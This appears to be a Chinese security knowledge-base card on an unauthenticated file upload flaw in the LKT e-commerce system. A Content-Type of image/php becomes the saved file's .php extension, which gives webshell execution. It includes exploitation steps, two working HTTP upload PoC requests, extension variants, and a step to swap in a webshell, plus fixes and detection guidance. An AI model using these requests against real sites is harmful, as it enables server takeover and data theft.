---
id: web-generic-file-upload-lkt-uploadimg-type-strreplace-php-webshell
title: 来客（LKT）电商系统 uploadImg/upload：$_FILES['type'] 经 str_replace('image/','.') 拼成扩展名，后台与未授权 API 均可上传 PHP Getshell
type: scenario
domain: web
path: web/generic/file-upload
technique: lkt-upload-imgfile-type-strreplace-extension-webshell
tags:
- php
- file-upload
- content-type
- str-replace
- extension-bypass
- webshell
- code-audit
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V509
  verified_at: '2026-11-11T05:04:45+08:00'
  notes: '已对照原文 content.md 与 14 张截图核对：图01 源码页面无版本号（仅‘最近一次更新在22天前’）；图03 源码 system/uploadImgAction.class.php 默认上传目录 ../LKT/images、图05 debug 显示配置值 ../images/；图04/图06 后台 system 入口 Content-Type: image/php 上传成功，响应回显 url 并访问图07 phpinfo（PHP 8.0.2）；图08 Seay 定位 api/userAction.class.php 与 extension/uploadImgAction.class.php 两处同模式；图09/10 extension 入口上传成功返回 url；图11 定位 api upload()；图12 用 imgFile 报 Undefined array key ''file''；图13 改用 file 且删除 Cookie 后仍 200 返回 1709265194373.php；图14 orderAction back_remark=htmlentities 背景行。已修正卡片把 system/API 默认上传目录混写为同一 ../images 的问题（system 默认 ../LKT/images、API 默认 ../images，实测配置值 ../images/）。dedup：与 content-type 白名单、条件优先级、Laravel 未授权上传等卡均为不同校验缺陷/产品，库内无其他 LKT 卡，非重复。原文未给版本号，未设置 affected_versions；SQLi 仅有 back_remark 代码行与 sqlmap 命令、无结果回显，维持 worker 跳过判断（notes 中记录 htmlentities 不防注入）。未在本机执行 PoC。'
url: /docs/web/generic/file-upload/web-generic-file-upload-lkt-uploadimg-type-strreplace-php-webshell/
draft: false
kb_aliases:
- 来客电商系统文件上传
- LKT uploadImgAction
- str_replace image 斜杠 点 后缀
- Content-Type image/php 上传
- lkt_upload 未授权上传
- mt_rand 文件名后缀可控
---

## 一句话结论

来客（LKT）电商系统的上传逻辑把客户端可控的 `$_FILES[...]['type']` 经 `str_replace('image/', '.', ...)` 转换后直接拼成落盘文件名：上传时把 part 的 `Content-Type` 改成 `image/php`，替换结果即 `.php`，`move_uploaded_file` 写入 `images` 目录后访问即执行；后台 `system`/`extension` 的 uploadImg 与未授权 API `module=api&action=user&m=upload` 使用同一写法，其中 API 入口删除 Cookie 后仍可上传，形成未授权 Getshell。

## 原理

- **可控的类型字段**：PHP 的 `$_FILES['file']['type']` 直接来自 multipart 每个 part 的 `Content-Type` 头，是客户端声明而非服务端探测结果，可随意构造。
- **替换即扩展名**：
  ```php
  $type = str_replace('image/', '.', $_FILES['imgFile']['type']);
  $imgURL_name = time() . mt_rand(1, 1000) . $type;
  move_uploaded_file($_FILES['imgFile']['tmp_name'], $uploadImg . $imgURL_name);
  ```
  `image/php` 经替换得到 `.php`，`image/jpeg` 得到 `.jpeg`；文件名由时间戳 + 随机数 + `$type` 组成，原始文件名被丢弃，扩展名完全由攻击者控制。上传目录来自配置表 `lkt_config.uploadImg`（为空时 system 入口默认 `../LKT/images`、API 入口默认 `../images`）；实测配置值为 `../images/`，故落盘在 `images` 目录。
- **为什么能解析**：`images` 位于 Web 根下且 PHP 可解析，`.php` 文件被直接执行；后台响应 `{"error":0,"url":"../images/<time><rand>.php"}` 回显路径，未授权 API 只回显文件名，但按同一代码可知仍落在 `/images/`。
- **三个入口同一 sink**：
  1. `/index.php?module=system&action=uploadImg`（后台，参数 `imgFile`，需 `admin_mojavi` 管理员会话）；
  2. `/index.php?module=extension&action=uploadImg`（后台，参数 `file`）；
  3. `/index.php?module=api&action=user&m=upload`（前台 API，参数 `file`；删除 Cookie 后仍上传成功，返回文件名）。
- **审计价值**：这类 `str_replace('image/', '.', $type)` 是"把客户端 MIME 当作扩展名来源"的危险模式——与"用 type 做白名单判断"不同，它直接把攻击者字符串写进文件名后缀，任何 `image/<脚本后缀>` 都能落盘。

## 触发条件

- 目标为来客（LKT）电商管理系统（Mojavi 风格 `index.php?module=&action=&m=` 路由，源码可在 `/app/webapp/modules/` 下确认）。
- 上传接口可达；后台入口需有效管理员会话，API 入口无需登录。
- `images`/配置的上传目录可写且 Web 可访问，PHP 解析未被禁用。
- 服务器未对上传目录做脚本执行限制（无 Nginx `location ~ \.php$` 拒绝对应目录、无 PHP-FPM 目录级 disable_functions 限制）。

## 利用步骤

1. 正常进入上传点（后台商品分类/扩展模块或前台 API），抓取 multipart 上传请求，确认参数名（`imgFile` 或 `file`）。
2. 将 part 的 `Content-Type` 改为 `image/php`，文件名任意（如 `shell.php`），内容为 `<?php phpinfo(); ?>`。
3. 后台入口：携带 `admin_mojavi` Cookie 发送到 `/index.php?module=system&action=uploadImg` 或 `/index.php?module=extension&action=uploadImg`，从响应 `url` 读取落地路径（`../images/...php`）。
4. 未授权入口：删除 Cookie，POST `/index.php?module=api&action=user&m=upload`，参数名 `file`，响应返回文件名，拼接 `/images/<文件名>` 访问。
5. 访问上传的 `.php` 验证执行（原文实测后台入口弹出 phpinfo）；后续替换为 webshell 或内存马。
6. 清理上传文件，评估是否需要进一步横向。

## PoC

```http
POST /index.php?module=api&action=user&m=upload HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=---------------------------323553422223467167571808530788
Content-Length: 240
Connection: close

-----------------------------323553422223467167571808530788
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/php

<?php phpinfo(); ?>
-----------------------------323553422223467167571808530788--
```

```http
POST /index.php?module=system&action=uploadImg HTTP/1.1
Host: 127.0.0.1:8080
Cookie: admin_mojavi=<有效管理员会话>
Content-Type: multipart/form-data; boundary=---------------------------3521672959703348041050404464

-----------------------------3521672959703348041050404464
Content-Disposition: form-data; name="imgFile"; filename="shell.php"
Content-Type: image/php

<?php phpinfo(); ?>
-----------------------------3521672959703348041050404464--
```

响应示例：`{"error":0,"url":"../images/1709261619691.php","message":""}`；浏览器访问 `/images/1709261619691.php` 执行。

## 变体与关联

- **同模式扩展名变体**：`image/phtml`、`image/php5`、`image/pht` 等可尝试绕过后缀黑名单；若目标只能解析 `.php`，保持 `image/php` 即可。
- **与白名单信任 type 的区别**：[[web-generic-file-upload-content-type-trust-bypass]] 是"后端用 type 做白名单、保留原始 .php 文件名"；本卡是"type 经 str_replace 后成为落盘扩展名"，两者审计点不同。
- **文件头校验**：若后续版本加入 `getimagesize`/`finfo`，需配合 GIF 文件头（[[web-generic-file-upload-magic-byte-gif-prefix-bypass]]）或图片马。
- **同产品其他上传**：审计工具全局搜索 `str_replace('image/', '.', $_FILES[` 可发现 `api/userAction.class.php`、`extension/uploadImgAction.class.php`、`system/uploadImgAction.class.php` 三处同一模式（原文即以此方式扩展攻击面）。

## 检测与防御

- **代码修复**：不要用 `$_FILES[...]['type']` 生成文件名或扩展名；从原始文件名取扩展名做白名单（只允许 jpg/png/gif/webp），再用服务端生成的随机名 + 固定扩展名落盘；`move_uploaded_file` 前用 `finfo_file()` 校验真实 MIME。
- **运行环境**：上传目录禁止脚本执行（Nginx/Apache 目录级配置、PHP-FPM 目录 `php_admin_flag engine off`），上传目录与 Web 根隔离或走独立域名/CDN。
- **鉴权**：API 上传接口必须校验登录态与业务权限；后台功能不得只靠前端隐藏。
- **检测**：上传请求 part 的 `Content-Type` 与文件名/内容不一致（如 `image/php`）；`images` 目录出现新增 `.php`/`.phtml` 文件；访问日志中上传后紧接对同目录脚本的请求；WAF 对 multipart Content-Type 含脚本后缀做告警。
- **应急**：排查上传目录中的可疑脚本文件与访问记录，删除 webshell、轮换管理员凭据，检查是否有后续命令执行/横向痕迹。
